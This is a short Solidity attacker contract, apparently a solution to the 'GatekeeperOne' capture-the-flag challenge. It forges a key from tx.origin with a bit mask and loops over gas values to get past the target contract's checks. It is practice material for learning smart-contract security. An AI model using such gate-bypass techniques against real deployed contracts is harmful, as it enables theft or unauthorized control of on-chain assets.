// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

// import "hardhat/console.sol";

contract GateIn {
    GatekeeperOne gate;

    constructor(address _gateAddress) {
        gate = GatekeeperOne(_gateAddress);
    }

    function enterGate() public {
        // bytes8 _key = bytes8(uint64(uint16(uint160(tx.origin)))) & 0xFFFFFFFF0000FFFF;
        bytes8 _key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;

        //  gate.enter{gas: 800000}(_key) ;

        for (uint256 i = 0; i <= 8191; i++) {
            try gate.enter{gas: 800000 + i}(_key) {
                // console.log("passed with gas ->", 800000 + i);
                break;
            } catch {}
        }
    }
}
